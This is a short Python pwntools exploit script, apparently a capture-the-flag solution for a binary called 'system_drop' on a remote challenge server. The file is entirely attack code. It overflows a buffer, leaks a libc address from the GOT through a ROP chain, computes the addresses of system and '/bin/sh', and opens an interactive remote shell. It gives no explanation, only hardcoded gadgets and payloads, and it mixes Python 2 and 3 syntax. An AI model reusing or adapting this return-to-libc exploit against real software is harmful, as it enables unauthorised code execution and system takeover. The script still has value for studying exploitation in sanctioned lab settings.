from pwn import *
from time import sleep
#from pwn import *
p = remote('138.68.151.248',30794)
#p = process("./system_drop_patched")
# p = process("./system_drop")
#raw_input()
#context.clear(
 #   arch="amd64",
    #log_level="debug"
#)
# pid = gdb.attach(p, gdbscript="break * main")

exe = context.binary = ELF('system_drop')
syscall = p64(0x000000000040053b)
pad = b'A' * 40  
alarm_got =p64(0x00601018)
bin_sh = p64(0x0601038)
pop_rsi_r15 = p64(0x00000000004005d1)
pop_rdi = p64(0x00000000004005d3)
read_plt = p64(0x0400440)
bin_sh_str = "/bin/sh\0"
padd = b"a" * 40
main = p64(0x00400541)
trash_addr = p64(0x00601028)
random_shit = "a" * 248
ret =p64(0x0000000000400416)


payload1 = pad
payload1 += bytes(pop_rdi)
payload1 += p64(0x1)
payload1 += pop_rsi_r15
payload1 += alarm_got
payload1 += p64(0x0)
payload1 += syscall
payload1 += main

p.send(payload1)
leak = u64(p.recv(6).ljust(8,'\0'))
libc_base = leak - 	0x0e4610
print libc_base
system = libc_base +0x04f550
bin_shss = libc_base + 0x1b3e1a


payload2 = pad
payload2 += bytes(pop_rdi)
payload2 += p64(bin_shss)
payload2 += p64(system)

p.send(payload2)

# leak = u64(p.recv(6).ljust(8,'\0'))
p.interactive()
